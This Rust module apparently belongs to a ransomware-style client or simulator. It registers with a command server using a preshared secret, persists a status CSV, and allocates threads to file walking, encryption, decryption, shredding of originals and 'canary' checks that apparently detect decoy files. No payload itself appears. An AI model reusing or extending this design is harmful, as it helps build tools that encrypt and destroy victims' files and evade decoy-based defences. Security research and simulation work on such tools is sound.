use log::{debug, error, warn};
use std::{path::Path, thread::available_parallelism};

use crate::{
    comm::register,
    config,
    status::{create_status, export_status_csv, import_status_csv, Status},
};

pub fn initialize_client(
    exe_path_dir: &Path,
    server_fqdn: &str,
    server_port: u16,
    preshared_secret: &str,
    https: bool,
    verify_server: bool,
) -> Status {
    import_status_csv(exe_path_dir).map_or_else(
        || {
            warn!("Existing status not imported");
            let new_status = create_status();
            register(
                server_fqdn,
                server_port,
                &new_status,
                preshared_secret,
                https,
                verify_server,
            )
            .expect("Failed to register with server - cannot continue");
            export_status_csv(exe_path_dir, &new_status);
            debug!("Created new status: {new_status:?}");
            new_status
        },
        |csv| {
            debug!("Successully imported status: {csv:?}");
            csv
        },
    )
}

#[derive(Clone, Debug)]
pub struct ThreadCounts {
    pub walk: usize,
    pub shred: usize,
    pub encrypt: usize,
    pub decrypt: usize,
    pub canary: usize,
}

pub fn get_thread_counts() -> ThreadCounts {
    let thread_count = match available_parallelism() {
        Ok(suggested) => {
            debug!("Successfully got suggested number of threads: {suggested}");
            suggested.get()
        }
        Err(error) => {
            error!("Failed to get suggested number of threads: {error}");
            1
        }
    };

    let canary_active =
        config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES;
    let shred_active = !config::ANALYZE_MODE;

    let walk_count = if thread_count >= 4 {
        (thread_count / 4).max(2)
    } else {
        1
    };
    let canary_count = if canary_active {
        (thread_count / 6).max(1)
    } else {
        0
    };
    let shred_count = if shred_active {
        (thread_count / 6).max(1)
    } else {
        0
    };

    let encrypt_count = thread_count
        .saturating_sub(walk_count + canary_count + shred_count)
        .max(1);

    let decrypt_count = thread_count.saturating_sub(walk_count).max(1);

    debug!(
        "Using {walk_count} walk, {canary_count} canary, {encrypt_count} encrypt, {shred_count} shred, {decrypt_count} decrypt"
    );

    ThreadCounts {
        walk: walk_count,
        shred: shred_count,
        encrypt: encrypt_count,
        decrypt: decrypt_count,
        canary: canary_count,
    }
}
